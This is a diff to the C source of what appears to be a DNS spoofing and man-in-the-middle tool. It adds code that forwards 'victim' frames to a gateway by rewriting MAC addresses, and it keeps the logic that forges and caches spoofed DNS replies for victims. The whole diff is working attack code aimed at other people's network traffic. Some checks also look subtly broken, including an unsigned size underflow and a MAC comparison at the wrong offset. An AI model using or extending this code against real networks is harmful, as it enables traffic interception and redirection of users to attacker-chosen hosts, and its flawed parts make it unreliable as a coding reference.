@@ -24,15 +24,15 @@ static char last_name_resolved[0xff] = "";
 
 static time_t last_resolution_time = 0;
 
-static int dnsf_ckr_packet_from_victim_to_dnsserver(const unsigned long src, const unsigned long dest, dnsf_ckr_realdnstransactions_ctx *transactions);
+static int dnsf_ckr_packet_from_victim_to_dnsserver(const unsigned int src, const unsigned int dest, dnsf_ckr_realdnstransactions_ctx *transactions);
 
 static char *dnsf_ckr_qname2cstr(const unsigned char *qname);
 
-static dnsf_ckr_victims_ctx *dnsf_ckr_get_victim_from_transactions(const unsigned long v_addr, dnsf_ckr_realdnstransactions_ctx *transactions);
+static dnsf_ckr_victims_ctx *dnsf_ckr_get_victim_from_transactions(const unsigned int v_addr, dnsf_ckr_realdnstransactions_ctx *transactions);
 
-static dnsf_ckr_hostnames_ctx *dnsf_ckr_must_spoof_dns_response(const unsigned long src_addr, const char *hostname, dnsf_ckr_fakenameserver_ctx *fakenameserver);
+static dnsf_ckr_hostnames_ctx *dnsf_ckr_must_spoof_dns_response(const unsigned int src_addr, const char *hostname, dnsf_ckr_fakenameserver_ctx *fakenameserver);
 
-static int dnsf_ckr_packet_from_victim_to_dnsserver(const unsigned long src, const unsigned long dest, dnsf_ckr_realdnstransactions_ctx *transactions) {
+static int dnsf_ckr_packet_from_victim_to_dnsserver(const unsigned int src, const unsigned int dest, dnsf_ckr_realdnstransactions_ctx *transactions) {
     dnsf_ckr_realdnstransactions_ctx *tp;
     for (tp = transactions; tp; tp = tp->next) {
         if (htonl(tp->victim->addr) == src && htonl(tp->sends_reqs_to->addr) == dest) {
@@ -64,7 +64,17 @@ static char *dnsf_ckr_qname2cstr(const unsigned char *qname) {
     return cstr;
 }
 
-static dnsf_ckr_victims_ctx *dnsf_ckr_get_victim_from_transactions(const unsigned long v_addr, dnsf_ckr_realdnstransactions_ctx *transactions) {
+static const dnsf_ckr_gateways_config_ctx *dnsf_ckr_get_gateway2forward(const dnsf_ckr_victims_ctx *victim, const unsigned int dest_addr, const dnsf_ckr_gateways_config_ctx *gateways) {
+    const dnsf_ckr_gateways_config_ctx *gp = NULL;
+    for (gp = gateways; gp; gp = gp->next) {
+        if (gp->victim == victim) {
+            return gp;
+        }
+    }
+    return NULL;
+}
+
+static dnsf_ckr_victims_ctx *dnsf_ckr_get_victim_from_transactions(const unsigned int v_addr, dnsf_ckr_realdnstransactions_ctx *transactions) {
     dnsf_ckr_realdnstransactions_ctx *tp;
     for (tp = transactions; tp; tp = tp->next) {
         if (htonl(tp->victim->addr) == v_addr) {
@@ -74,7 +84,7 @@ static dnsf_ckr_victims_ctx *dnsf_ckr_get_victim_from_transactions(const unsigne
     return NULL;
 }
 
-static dnsf_ckr_hostnames_ctx *dnsf_ckr_must_spoof_dns_response(const unsigned long src_addr, const char *hostname, dnsf_ckr_fakenameserver_ctx *fakenameserver) {
+static dnsf_ckr_hostnames_ctx *dnsf_ckr_must_spoof_dns_response(const unsigned int src_addr, const char *hostname, dnsf_ckr_fakenameserver_ctx *fakenameserver) {
     dnsf_ckr_fakenameserver_ctx *fp;
     dnsf_ckr_hostnames_ctx *hp;
     for (fp = fakenameserver; fp; fp = fp->next) {
@@ -110,17 +120,18 @@ static void dnsf_ckr_spoof_dns_response(struct dnsf_ckr_dns_header **dns, dnsf_c
     memcpy((*dns)->rscrecfmt.rdata, &hostname->addr, sizeof(hostname->addr));
 }
 
-dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t pktsz, unsigned char **outpkt, size_t *outpktsz, dnsf_ckr_realdnstransactions_ctx *transactions, dnsf_ckr_fakenameserver_ctx *fakenameserver, const unsigned char src_mac[6], char *domain_name, size_t domain_name_sz, dnsf_ckr_victims_ctx **victim, dnsf_ckr_hostnames_ctx **hostinfo, const int dnsspf_ttl, dnsf_ckr_dnsresolvcache_ctx **dnscache, const int cache_size) {
+dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t pktsz, unsigned char **outpkt, size_t *outpktsz, dnsf_ckr_realdnstransactions_ctx *transactions, dnsf_ckr_fakenameserver_ctx *fakenameserver, dnsf_ckr_gateways_config_ctx *gateways, const unsigned char src_mac[6], const unsigned char lo_mac[6], char *domain_name, size_t domain_name_sz, dnsf_ckr_victims_ctx **victim, dnsf_ckr_hostnames_ctx **hostinfo, const int dnsspf_ttl, dnsf_ckr_dnsresolvcache_ctx **dnscache, const int cache_size) {
     struct dnsf_ckr_ip_header *ip = NULL;
     struct dnsf_ckr_udp_header *udp = NULL;
     struct dnsf_ckr_ethernet_frame eth;
     struct dnsf_ckr_dns_header *dns = NULL;
     dnsf_ckr_hostnames_ctx *hp = NULL;
     dnsf_ckr_victims_ctx *vp;
+    const dnsf_ckr_gateways_config_ctx *gp = NULL;
     char *hostname = NULL;
     unsigned char *rawpkt = NULL;
     unsigned short temp_port;
-    unsigned long temp_addr;
+    unsigned int temp_addr;
     size_t rawpktsz;
     dnsf_ckr_dnsresolvcache_ctx *cache_entry = NULL;
     dnsf_ckr_action_t action = dnsf_ckr_action_none;
@@ -129,10 +140,10 @@ dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t
     }
     *victim = NULL;
     *hostinfo = NULL;
-    if (pktsz < 20) {
+    if (pktsz - 14 < 20) {
         return dnsf_ckr_action_none;
     }
-    ip = dnsf_ckr_parse_ip_dgram(pkt, pktsz);
+    ip = dnsf_ckr_parse_ip_dgram(pkt + 14, pktsz - 14);
     if (ip == NULL) {
         return dnsf_ckr_action_none;
     }
@@ -229,16 +240,13 @@ dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t
                                 udp->payload = dnsf_ckr_mk_dnsresponse(&udp->payload_size, udp->payload, udp->payload_size, ip->dest);
                                 if (udp->payload_size > 0) {
                                     *dnscache = push_resolution_to_dnsf_ckr_dnsresolvcache_ctx(dnscache, (size_t)cache_size, hostname, strlen(hostname), udp->payload, (size_t)udp->payload_size);
-                                    printf("ADDED %s %d\n", (*dnscache)->dname, udp->payload_size);
                                 }
                             } else {
                                 udp->payload = (unsigned char *) dnsf_ckr_getmemory(cache_entry->reply_size);
                                 udp->payload_size = cache_entry->reply_size;
                                 udp->payload[0] = (dns->id >> 8);
                                 udp->payload[1] = (dns->id & 0x00ff);
-                                printf("%d\n", cache_entry->reply_size - 2);
                                 memcpy(&udp->payload[2], &cache_entry->reply[2], cache_entry->reply_size - 2);
-                                printf("READ FROM CACHE ;)\n");
                             }
                             pthread_mutex_unlock(&dnscaching_mtx);
                             udp->len += udp->payload_size;
@@ -301,9 +309,25 @@ dnsf_ckr_action_t dnsf_ckr_proc_ip_packet(const unsigned char *pkt, const size_t
             }
         } else {
             action = dnsf_ckr_proc_eth_frame(pkt, pktsz, outpkt, outpktsz, transactions);
-            //*outpkt = NULL;
         }
-
+    } else {
+        //  sometimes in some environments dns servers can act like gateways, so....
+        //  when (ip->src == from some victim and dest_mac == local_mac and ip->dest == some dns server which victims accesses)
+        //  we'll try to correct the ethernet frame and repass it.
+        vp = dnsf_ckr_get_victim_from_transactions(ip->src, transactions);
+        if (vp != NULL) {
+            *victim = vp;
+            if (memcmp(pkt + sizeof(lo_mac), lo_mac, sizeof(lo_mac)) == 0) {
+                gp = dnsf_ckr_get_gateway2forward(vp, ip->dest, gateways);
+                if (gp != NULL) {
+                    *outpkt = (unsigned char *) dnsf_ckr_getmemory(pktsz);
+                    memcpy(*outpkt, pkt, pktsz);
+                    memcpy(*outpkt + sizeof(lo_mac), gp->gateway_hw_addr, 6);
+                    *outpktsz = pktsz;
+                    action = dnsf_ckr_action_forward;
+                }
+            }
+        }
     }
     if (ip != NULL) {
         if (ip->payload != NULL) {
